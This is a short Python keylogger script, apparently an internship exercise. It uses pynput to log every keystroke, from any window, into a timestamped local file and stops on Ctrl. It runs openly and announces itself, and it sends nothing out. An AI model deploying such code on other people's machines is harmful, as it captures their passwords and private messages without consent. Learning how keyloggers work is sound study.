from pynput import keyboard
from datetime import datetime
import logging
import os

save_dir = r"C:\Users\NAFEESATH MISBHA\Downloads\Internship"
filename = os.path.join(save_dir, f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt")

print(f"Keylogger started. Logging to {filename}")
print("Type anything here or anywhere. Press Left or Right Ctrl to stop.\n")

logging.basicConfig(filename=filename, level=logging.DEBUG, format='%(asctime)s: %(message)s')
logging.getLogger().addHandler(logging.StreamHandler())

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")
    
    if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
        print(f"\nCtrl detected. Stopping. Log saved to {filename}")
        return False

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
